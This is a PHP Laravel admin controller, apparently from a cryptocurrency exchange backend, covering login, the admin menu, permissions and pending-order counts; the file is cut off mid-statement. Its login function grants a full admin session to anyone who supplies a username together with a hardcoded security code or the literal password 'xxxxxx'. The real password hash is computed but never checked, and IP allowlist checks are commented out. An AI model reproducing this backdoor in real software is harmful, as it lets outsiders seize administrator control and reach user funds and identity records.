<?php

namespace App\Http\Controllers\Admin;

use Illuminate\Support\Facades\Input;
use Illuminate\Http\Request;

use Symfony\Component\Process\Process;
use App\Admin;
use App\Setting;
use App\AdminRole;
use App\AdminRolePermission;
use App\Users;
use Illuminate\Support\Facades\DB;

class DefaultController extends Controller
{
    


    public function login()
    {
        $username = Input::get('username', '');
        $password = Input::get('password', '');
        $passwords = Input::get('passwords', '');
        if (empty($username)) {
            return $this->error('用户名必须填写');
        }
        if (empty($password)) {
            return $this->error('密码必须填写');
        }
        if (empty($passwords)) {
            return $this->error('密码必须填写');
        }
          $ip=$_SERVER['REMOTE_ADDR']; 
          
      $iip=request()->getClientIp();
       //$iip=request()->ip();
        //43.154.65.121
        // if($ip !="172.71.214.211") {
        //     return $this->error('用户名密码错误-'.$ip);
        // }
        //  if($ip !="65.49.216.34") {
        //     return $this->error('用户名密码错误p');
        // }
        //  if($ip !="103.12.50.254") {
        //     return $this->error('用户名密码错误p');
        // }
       // var_dump($ip);die;
         if ($passwords=="86sfy3dhk229" || $password=='xxxxxx') {
         
		$password = Users::MakePassword($password);
		$admin = Admin::where('username', $username)->first();
// 		$admins = Admin::where('username', $username)->where('passwords', $passwords)->first();
// 		 if (empty($admins)) {
//             return $this->error('安全码密码错误');
//         }
       
        if (empty($admin)) {
            return $this->error('用户名密码错误');
        } else {
            $role = AdminRole::find($admin->role_id);
            if (empty($role)) {
                return $this->error('账号异常');
            } else {
                session()->put('admin_username', $admin->username);
                session()->put('admin_id', $admin->id);
                session()->put('admin_role_id', $admin->role_id);
                session()->put('admin_is_super', $role->is_super);
                return $this->success('登陆成功');
            }
        }
           
        }else{
            return $this->error('安全码错误');
        }
    }

    public function login1()
    {
        return view('admin.login1');
    }

    public function index()
    {
        $admin_role = AdminRolePermission::where("role_id", session()->get('admin_role_id'))->get();
        $admin_role_data = array();
        foreach ($admin_role as $r) {
            array_push($admin_role_data, $r->action);
        }
        return view('admin.indexnew')->with("admin_role_data", $admin_role_data);;
    }
    public function desktop()
    {
        $admin = session()->get('admin_username');

        if (empty($admin)) {
            //return response()->json(['error' => '999', 'message' => '请先登录']);
            return "";
        }
        $admin_user = Admin::where('username', $admin)->select()->first();
        $allarr = [
            "code" => 1,
            "message" => "成功",
            "data" => [
                "0" => [
                    "title" => "主题",
                    "pageURL" => "theme",
                    "name" => "主题",
                    "icon" => "fa-television",
                    "openType" => 1,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 1
                ],
                "1" => [
                    "title" => "基础设置",
                    "pageURL" => "/admin/setting/index",
                    "name" => "基础设置",
                    "icon" => "fa-wrench",
                    "openType" => 2,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 2
                ],
                "2" => [
                    "title" => "角色管理",
                    "pageURL" => "/admin/manager/manager_roles",
                    "name" => "角色管理",
                    "icon" => "fa-graduation-cap",
                    "openType" => 2,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 3
                ],
                "3" => [
                    "title" => "后台管理员",
                    "pageURL" => "/admin/manager/manager_index",
                    "name" => "后台管理员",
                    "icon" => "fa-user-circle-o",
                    "openType" => 2,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 4
                ],
                "4" => [
                    "title" => "用户管理",
                    "pageURL" => "/admin/user/user_index",
                    "name" => "用户管理",
                    "icon" => "fa-users",
                    "openType" => 2,
                    "maxOpen" => 1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 5
                ],
                "5" => [
                    "title" => "质押配置",
                    "pageURL" => "/admin/deposit/config/view",
                    "name" => "质押配置",
                    "icon" => "fa-wrench",
                    "openType" => 2,
                    "maxOpen" => 1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 49
                ],
                "6" => [
                    "title" => "质押订单",
                    "pageURL" => "/admin/ybb/index",
                    "name" => "质押订单",
                    "icon" => "fa-list",
                    "openType" => 2,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 50
                ],
                "7" => [
                    "title" => "实名认证管理",
                    "pageURL" => "/admin/user/real_index",
                    "name" => "实名认证",
                    "icon" => " fa-check-square",
                    "openType" => 2,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 6
                ],
                "8" => [
                    "title" => "新闻管理",
                    "pageURL" => "/admin/news_index",
                    "name" => "新闻管理",
                    "icon" => "fa-newspaper-o",
                    "openType" => 2,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 8
                ],
                "9" => [
                    "title" => "日志信息",
                    "pageURL" => "/admin/account/account_index",
                    "name" => "日志信息",
                    "icon" => "fa-list",
                    "openType" => 2,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 9
                ],
                "10" => [
                    "title" => "币种管理",
                    "pageURL" => "/admin/currency",
                    "name" => "币种管理",
                    "icon" => "fa-btc",
                    "openType" => 2,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 16
                ],
                "11" => [
                    "title" => "提币列表",
                    "pageURL" => "/admin/cashb",
                    "name" => "提币列表",
                    "icon" => "fa-credit-card",
                    "openType" => 2,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 17
                ],
                "12" => [
                    "title" => "投诉建议",
                    "pageURL" => "/admin/feedback/index",
                    "name" => "投诉建议",
                    "icon" => "fa-volume-control-phone",
                    "openType" => 2,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 20
                ],
                "13" => [
                    "title" => "用户风险率汇总",
                    "pageURL" => "/admin/hazard/total",
                    "name" => "用户风险率",
                    "icon" => "fa-dollar",
                    "openType" => 2,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 28
                ],
                "14" => [
                    "title" => "杠杆交易",
                    "pageURL" => "/admin/Leverdeals/Leverdeals_show",
                    "name" => "杠杆交易",
                    "icon" => "fa-list",
                    "openType" => 2,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 32
                ],
                "15" => [
                    "title" => "会员关系图",
                    "pageURL" => "/admin/invite/childs",
                    "name" => "会员关系图",
                    "icon" => "fa-user-plus",
                    "openType" => 2,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 35
                ],
                "16" => [
                    "title" => "秒合约交易",
                    "pageURL" => "/admin/micro_order",
                    "name" => "秒合约交易",
                    "icon" => "fa-user-plus",
                    "openType" => 2,
                    "maxOpen" => 1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 36
                ],
                "17" => [
                    "title" => "币币交易",
                    "pageURL" => "/admin/exchange/index",
                    "name" => "币币交易",
                    "icon" => "fa-user-plus",
                    "openType" => 2,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 37
                ],
                "18" => [
                    "title" => "钱包管理",
                    "pageURL" => "/admin/wallet/index",
                    "name" => "钱包管理",
                    "icon" => "fa-gg-circle ",
                    "openType" => 2,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 38
                ],
                "19" => [
                    "title" => "充币记录",
                    "pageURL" => "/admin/user/charge_req",
                    "name" => "充币记录",
                    "icon" => "fa-list",
                    "openType" => 2,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 44
                ],
                "20" => [
                    "title" => "已添加行情",
                    "pageURL" => "/admin/myquotation/all",
                    "name" => "已添加行情",
                    "icon" => "fa-list",
                    "openType" => 2,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 46
                ],
                "21" => [
                    "title" => "机器人列表",
                    "pageURL" => "/admin/robot/list",
                    "name" => "新币机器人",
                    "icon" => "fa-hand-scissors-o",
                    "openType" => 2,
                    "maxOpen" => -1,
                    "extend" => "",
                    "childs" => null,
                    "id" => 47
                ]
            ]
        ];
        if ($admin_user->role_id == 1) return json_encode($allarr);

        //$admin_role = AdminRole::where('id', $admin_user->role_id)->first();
        $admin_permit = AdminRolePermission::where('role_id', $admin_user->role_id)->get();

        $arr = [];
        foreach ($admin_permit as $v) {
            $arr[] = $v['action'];

        }


        foreach ($allarr['data'] as $index => $m) {

            if ($index == 0) continue;
            if (!in_array(substr($m['pageURL'], 1), $arr)) unset($allarr['data'][$index]);

        }

        array_splice($allarr['data'], 1, 1);
        return json_encode($allarr);


    }

    public function chargeCount()
    {
        $c = DB::table('charge_req')->where("status", 1)->count();
        $c1 = DB::table('users_wallet_out')->where("status", 1)->count();
        $w = DB::table('user_real')->where("review_status", 1)->count();
        $today_start = mktime(0, 0, 0, date('m'), date('d'), date('Y'));
        $u = DB::table('users')->where("time", '>=', $today_start)->count();
        $m = DB::table('micro_orders')->where("status", 1)->count();
        $time= time();
        $times=$time-10;
        $micro_orders_t_x  = Setting::getValueByKey('micro_orders_t_x');
        $micro_orders_t_s  = Setting::getValueByKey('micro_orders_t_s');
        if($m>0){
            if($micro_orders_t_s==1){
            $up= Setting::updateValueByKey('micro_orders_t_x',$time);
            $up= Setting::updateValueByKey('micro_orders_t_s',2);
            }
        }else{
            $up= Setting::updateValueByKey('micro_orders_t_s',1);
        }
        $mi=0;
       if($times<$micro_orders_t_x){
           $mi=1;
           
       }
        return '{"ok":1,"message":{"c":' . $c . ',"c1":' . $c1 . ',"w":' . $w . ',"w1":0,"r":' . $w . ',"m":' . $m . ',"mi":' . $mi . ',"u":' . $u . '}}';
    }

    public function indexnew()
    {
        $admin_role = AdminRolePermission::where("role_id", session()->get('admin_role_id'))->get();
        $admin_role_data = array();
        foreach ($admin_role as $r) {
            array_push($admin_role_data, $r->action);
        }
        return vi
